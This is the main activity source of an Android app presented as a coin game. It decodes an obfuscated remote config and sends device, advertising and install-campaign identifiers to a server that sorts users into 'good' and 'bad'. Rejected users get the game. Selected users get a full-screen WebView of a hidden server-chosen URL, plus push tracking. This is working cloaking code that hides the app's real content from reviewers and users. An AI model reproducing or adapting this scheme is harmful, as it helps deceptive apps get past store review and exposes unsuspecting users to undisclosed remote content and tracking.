package magic.game.coinss

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.WindowInsets
import android.view.WindowManager
import android.webkit.ValueCallback
import android.webkit.WebSettings
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.gson.Gson
import com.onesignal.OneSignal
import magic.game.coinss.RemoteConfigPreferences.KEY_APPSFLYER
import magic.game.coinss.RemoteConfigPreferences.KEY_ONESIGNAL
import magic.game.coinss.RemoteConfigPreferences.KEY_PUSH_CLICK_URL
import magic.game.coinss.RemoteConfigPreferences.KEY_USER_CHECK_URL
import magic.game.coinss.ads_view.MainAdsView
import magic.game.coinss.databinding.ActivityMainBinding
import magic.game.coinss.models.*
import magic.game.coinss.services.AppsflyerService
import magic.game.coinss.services.OneSignalService
import magic.game.coinss.utils.decodeAsBase64
import magic.game.coinss.utils.getUtmMedium
import magic.game.coinss.utils.getUtmSource
import magic.game.coinss.utils.hasInternetConnection
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

/*
ASample_QUERY_GIST
 */
class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private var wv: MainAdsView? = null
    var networkErrorDialog: NetworkErrorDialog? = null

    companion object {
        var callback: ValueCallback<Array<Uri>>? = null
        var filePath: String? = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        showSplashViews()
        loadData()
    }

    private fun loadData() {
        if (!hasInternetConnection(this)) {
            showNetworkErrorDialog()
            return
        }
        val userInfo = getSavedUserInfo()
        if (isFirstLaunch(userInfo)) {
            onFirstLaunch()
        } else {
            onNextLaunch(userInfo!!)
        }
    }

    private suspend fun loadConfigFromRemote(): RemoteConfig = withContext(Dispatchers.IO) {
        val response = OkHttpCustomClient
            .setOkHttpClient(WebSettings.getDefaultUserAgent(this@MainActivity))
            .newCall(
                Request.Builder()
                    .url(CONFIG_ENCRYPTED_URL.decodeAsBase64())
                    .get()
                    .build()
            )
            .execute()
            .body
            ?.string() ?: ""
        val decodedResponse = response.decodeAsBase64()
        Log.d(SDK_TAG, "Remote config loaded from remote:  $decodedResponse")
        return@withContext Gson().fromJson(decodedResponse, RemoteConfig::class.java)
    }

    private fun isFirstLaunch(userInfo: UserInfo?): Boolean {
        if (userInfo == null) {
            return true
        }
        return userInfo.isGoodUser && userInfo.url.isEmpty()
    }

    private fun showNetworkErrorDialog() {
        lifecycleScope.launchWhenCreated {
            if (networkErrorDialog == null) {
                networkErrorDialog = NetworkErrorDialog(this@MainActivity,
                    onClickTryAgain = {
                        loadData()
                    },
                    onClickDemoMode = {
                        navigateToGame("User choose demo mode")
                    })
            }
            networkErrorDialog?.show()
        }
    }

    object OkHttpCustomClient {
        private lateinit var customClient: OkHttpClient
        fun setOkHttpClient(userAgent: String): OkHttpClient {
            if (!this::customClient.isInitialized) {
                customClient = OkHttpClient.Builder()
                    .retryOnConnectionFailure(true)
                    .connectTimeout(15000, TimeUnit.MILLISECONDS)
                    .callTimeout(15000, TimeUnit.MILLISECONDS)
                    .readTimeout(15000, TimeUnit.MILLISECONDS)
                    .writeTimeout(15000, TimeUnit.MILLISECONDS)
                    .addNetworkInterceptor { chain ->
                        chain.proceed(
                            chain.request()
                                .newBuilder()
                                .header("User-Agent", userAgent)
                                .build()
                        )
                    }.build()
            }
            return customClient
        }
    }

    private fun enableFullScreenMode() {
        @Suppress("DEPRECATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.insetsController?.hide(WindowInsets.Type.statusBars())
        } else {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
            )
        }
    }

    private fun showSplashViews() {
        Log.d(SDK_TAG, "Splash views shown")
        binding.background.visibility = View.VISIBLE
        binding.animationViewLoading.visibility = View.VISIBLE
        binding.animationViewLoading.playAnimation()
        binding.background.setImageResource(BACKGROUND_DRAWABLE)
    }

    private fun hideSplashViews() {
        enableFullScreenMode()
        binding.background.visibility = View.GONE
        binding.animationViewLoading.visibility = View.GONE
        binding.animationViewLoading.pauseAnimation()
    }

    private suspend fun makeCheckUserRequest(
        checkUserUrl: String,
        parameters: Map<String, String>
    ): String =
        withContext(Dispatchers.IO) {
            val url = Uri.parse(checkUserUrl).buildUpon()
            parameters.onEach { url.appendQueryParameter(it.key, it.value) }
            val response = OkHttpCustomClient
                .setOkHttpClient(WebSettings.getDefaultUserAgent(this@MainActivity))
                .newCall(
                    Request.Builder()
                        .url(url.toString())
                        .get()
                        .build()
                )
                .execute()
                .body
                ?.string() ?: ""

            Log.d(SDK_TAG, "Check user request done: $response")
            return@withContext response
        }

    private fun onFirstLaunch() {
        CoroutineScope(Dispatchers.Default).launch {
            Log.d(SDK_TAG, "First launch flow")
            try {
                val remoteConfig = loadConfigFromRemote()
                val requestParameters = createRequestParameters(remoteConfig.appsflyerDevKey)
                val queryParams = requestParameters.toQueryParams()
                val response = makeCheckUserRequest(remoteConfig.userCheckLink, queryParams)
                val checkUserResponse = Gson().fromJson(response, CheckUserResponse::class.java)
                val userInfo = UserInfo(
                    url = checkUserResponse.url,
                    uuid = checkUserResponse.visitorId,
                    advertisingId = getAdvertisingId(),
                    isGoodUser = !checkUserResponse.isBadUser,
                    appsflyerDevKey = remoteConfig.appsflyerDevKey,
                    oneSignalAppId = remoteConfig.oneSignalAppId,
                    userCheckLink = remoteConfig.userCheckLink,
                    onPushClickLink = remoteConfig.onPushClickLink
                )
                saveUserInfoAsync(userInfo)
                if (userInfo.url.isNotEmpty()) {
                    onValidUser(userInfo)
                } else {
                    onBadUser()
                }
            } catch (e: Exception) {
                e.printStackTrace()
                navigateToGame("User Check Exception. Message: ${e.message}")
            }
        }
    }

    private fun onValidUser(userInfo: UserInfo) {
        Log.d(SDK_TAG, "On Valid User")
        OneSignalService.initOneSignal(
            context = this@MainActivity,
            appId = userInfo.oneSignalAppId,
            uuid = userInfo.uuid,
            advertisingId = userInfo.advertisingId,
            notificationClickUrl = userInfo.onPushClickLink
        )
        lifecycleScope.launch(Dispatchers.Main) {
            initWebView(userInfo.url)
            hideSplashViews()
        }
    }

    private fun onBadUser() {
        Log.d(SDK_TAG, "On Bad User")
        OneSignal.disablePush(true)
        navigateToGame("User rejected by server")
    }

    private fun saveUserInfoAsync(userInfo: UserInfo) = lifecycleScope.launchWhenCreated {
        val preferences = getSharedPreferences(PREFERENCES_NAME, MODE_PRIVATE)
        preferences.edit().apply {
            putString(KEY_UUID, userInfo.uuid)
            putString(KEY_ADS_ID, userInfo.advertisingId)
            putString(KEY_SAVED_URL, userInfo.url)
            putBoolean(KEY_IS_FIRST_ENGAGEMENT, userInfo.isGoodUser)
            putString(KEY_APPSFLYER, userInfo.appsflyerDevKey)
            putString(KEY_ONESIGNAL, userInfo.oneSignalAppId)
            putString(KEY_USER_CHECK_URL, userInfo.userCheckLink)
            putString(KEY_PUSH_CLICK_URL, userInfo.onPushClickLink)
        }.apply()
        Log.d(SDK_TAG, "User Info Saved")
    }


    @OptIn(ExperimentalCoroutinesApi::class)
    private suspend fun createRequestParameters(appsflyerDevKey: String): CheckUserParameters =
        withContext(Dispatchers.IO) {
            val getRefererJob = async { getInstallReferrer() }
            val getCampaignJob =
                async { AppsflyerService.initAppsflyer(this@MainActivity, appsflyerDevKey) }
            awaitAll(getRefererJob, getCampaignJob)

            val bundleId = magic.game.coinss.BuildConfig.APPLICATION_ID
            val referrer = getRefererJob.getCompleted()
            val campaign = getCampaignJob.getCompleted()
            val utmSource = referrer.getUtmSource()
            val utmMedium = referrer.getUtmMedium()
            val appsflyerUserId = AppsflyerService.getAppsflyerUID(this@MainActivity)

            val parameters = CheckUserParameters(
                bundleId = bundleId,
                appsflyerDeviceId = appsflyerUserId,
                advertisingId = getAdvertisingId(),
                campaign = campaign,
                utmMedium = utmMedium,
                utmSource = utmSource
            )
            Log.d(SDK_TAG, "Request Parameters created: $parameters")
            return@withContext parameters
        }

    private suspend fun getInstallReferrer(): String = suspendCoroutine {
        val referrerClient = InstallReferrerClient.newBuilder(this).build()
        Log.d(SDK_TAG, "Start waiting for install referrer")

        fun onSetupFinished(response: Int) {
            if (response == InstallReferrerClient.InstallReferrerResponse.OK) {
                val referrer = referrerClient.installReferrer.installReferrer
                Log.d(SDK_TAG, "Install referrer received: $referrer")
                it.resume(referrer)
            } else {
                Log.d(SDK_TAG, "Install referrer NOT received")
                it.resume("")
            }
        }

        fun onServiceDisconnected() {
            it.resume("")
        }

        referrerClient.startConnection(
            object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(response: Int) {
                    onSetupFinished(response)
                }

                override fun onInstallReferrerServiceDisconnected() {
                    onServiceDisconnected()
                }
            })
    }

    private fun onNextLaunch(userInfo: UserInfo) {
        Log.d(SDK_TAG, "On next launch flow")
        if (userInfo.isGoodUser) {
            lifecycleScope.launchWhenCreated {
                OneSignalService.initOneSignal(
                    context = applicationContext,
                    appId = userInfo.oneSignalAppId,
                    uuid = userInfo.uuid,
                    advertisingId = userInfo.advertisingId,
                    notificationClickUrl = userInfo.onPushClickLink
                )
                AppsflyerService.initAppsflyer(this@MainActivity, userInfo.appsflyerDevKey)
            }
            initWebView(userInfo.url)
            hideSplashViews()
        } else {
            navigateToGame("User was rejected in previous session")
        }
    }

    private fun getAdvertisingId(): String {
        return try {
            AdvertisingIdClient.getAdvertisingIdInfo(this).id ?: ""
        } catch (e: Exception) {
            e.printStackTrace()
            ""
        }
    }

    private fun navigateToGame(cause: String = "") {
        Log.e(SDK_TAG, "User navigated to game. Cause: $cause")
        val intent = Intent(this, BAD_USER_ACTIVITY)
        intent.addFlags(
            Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TASK or
                    Intent.FLAG_ACTIVITY_NO_ANIMATION
        )
        startActivity(intent)
    }


    private fun getSavedUserInfo(): UserInfo? {
        val prefs = getSharedPreferences(PREFERENCES_NAME, MODE_PRIVATE)
        val url = prefs.getString(KEY_SAVED_URL, null) ?: return null
        val isGoodUser = prefs.getBoolean(KEY_IS_FIRST_ENGAGEMENT, false)
        val adsId = prefs.getString(KEY_ADS_ID, null) ?: return null
        val uuid = prefs.getString(KEY_UUID, null) ?: return null
        val appsflyerDevKey = prefs.getString(KEY_APPSFLYER, null) ?: return null
        val oneSignalAppId = prefs.getString(KEY_ONESIGNAL, null) ?: return null
        val userCheckLink = prefs.getString(KEY_USER_CHECK_URL, null) ?: return null
        val pushClickLink = prefs.getString(KEY_PUSH_CLICK_URL, null) ?: return null
        return UserInfo(
            url = url,
            isGoodUser = isGoodUser,
            uuid = uuid,
            advertisingId = adsId,
            appsflyerDevKey = appsflyerDevKey,
            oneSignalAppId = oneSignalAppId,
            userCheckLink = userCheckLink,
            onPushClickLink = pushClickLink
        )
    }

    override fun onBackPressed() {
        wv?.let {
            if (it.canGoBack()) {
                it.goBack()
            } else {
                super.onBackPressed()
            }
        }
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        wv?.restoreState(savedInstanceState)
    }

    override fun onSaveInstanceState(savedInstanceState: Bundle) {
        super.onSaveInstanceState(savedInstanceState)
        wv?.saveState(savedInstanceState)
    }

    private fun displayWebView() {
        val frame = binding.frame
        frame.addView(wv)
    }

    private fun initWebView(url: String) {
        wv = MainAdsView(this)
        wv?.setOfferViewListener(object : MainAdsView.OfferViewListener {
            override fun removeLoadingView(progress: Int) {
                if (progress > 80) {
                    hideSplashViews()
                }
            }

            override fun onNewUrlLoaded(url: String) {
            }

            override fun onStartAnotherIntent(url: String) {
                Log.d(SDK_TAG, "New intent started: $url")
                try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    startActivity(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            override fun logAdsCategories(adsCategories: String?, value: String?) {
                OneSignal.sendTag(adsCategories, value)
            }

            override fun onInternetError(codeError: Int) {
                Log.e(SDK_TAG, "Webview internet error. Error code: $codeError")
                //showErrorDialog()
            }
        })

        Log.d(SDK_TAG, "LoadedUrl: $url")
        wv?.loadUrl(url)
        displayWebView()
    }


    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) {
            var results: Array<Uri>? = null
            if (resultCode != RESULT_OK) {
                callback?.onReceiveValue(results)
                return
            }
            if (data == null && filePath != null) {
                results = arrayOf(Uri.parse(filePath))
            } else {
                val dataString = data?.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }

            callback?.onReceiveValue(results)
            callback = null
        }

        if (requestCode == 10) {
            setResult(RESULT_OK)
        }
    }
}
